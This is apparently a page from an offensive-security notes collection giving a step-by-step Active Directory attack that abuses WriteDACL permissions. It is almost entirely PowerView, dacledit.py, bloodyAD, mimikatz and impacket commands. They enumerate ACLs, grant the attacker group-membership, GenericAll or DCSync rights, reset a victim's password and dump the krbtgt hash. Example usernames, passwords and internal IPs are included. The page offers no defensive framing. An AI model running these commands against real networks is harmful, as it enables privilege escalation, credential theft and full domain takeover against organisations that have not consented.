---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/ad-attack/abuse-acls/writedacl
---

# WriteDACL

## WriteDACL

Enumeration

{% code title="PowerView" overflow="wrap" %}
```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```
{% endcode %}

### WriteDacl over Group



<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

We grant full control over the group

{% code overflow="wrap" %}
```bash
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'bollea.lee' -target-dn 'CN=IT-SUPPORT L2,CN=USERS,DC=GRANDSTAY,DC=LOCAL' 'grandstay.local/bollea.lee':'sweetleehan' -dc-ip 192.168.178.187

```
{% endcode %}

We add ourselves to the group

{% code overflow="wrap" %}
```bash
bloodyAD -d grandstay.local -u bollea.lee -p 'sweetleehan' --host 192.168.178.187 add groupMember 'IT-SUPPORT L2' bollea.lee     
```
{% endcode %}

### GenericAll

Abuse WriteDACL

{% code title="PowerView" overflow="wrap" %}
```powershell
Add-DomainObjectAcl -TargetIdentity sieng.chantrea -PrincipalIdentity khan.chanthou -Rights All
```
{% endcode %}

Verify ACL

{% code title="PowerView" overflow="wrap" %}
```powershell
Get-ObjectAcl -Identity sieng.chantrea -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```
{% endcode %}

We can either reset password or dcsync

```powershell
net user sieng.chantrea Password123 /domain
```

### DCSync

{% code title="PowerView" overflow="wrap" %}
```powershell
Add-DomainObjectAcl -TargetIdentity Object_Name -PrincipalIdentity khan.chanthou -Rights DCSync
```
{% endcode %}

We can perform DCSync Attack

```python
mimikatz# lsadump::dcsync /user:krbtgt

impacket-secretsdump -just-dc-user krbtgt vulnableone/sqlsvc@10.10.10.10
```
